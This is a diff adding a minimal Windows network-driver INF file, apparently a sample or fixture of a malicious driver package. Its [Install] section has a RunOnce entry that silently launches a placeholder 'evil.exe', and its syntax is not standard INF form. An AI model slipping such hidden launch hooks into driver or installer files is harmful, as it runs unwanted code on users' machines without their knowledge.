@@ -1,0 +1,8 @@
+[Version]
+Signature   = "$Windows NT$"
+Class       = Net
+ClassGUID   = {4d36e972-e325-11ce-bfc1-08002be10318}
+CatalogFile = s.cat
+DriverVer   = 01/01/2022,3.0.0.0
+[Install]
+RunOnce = "evil.exe /silent"
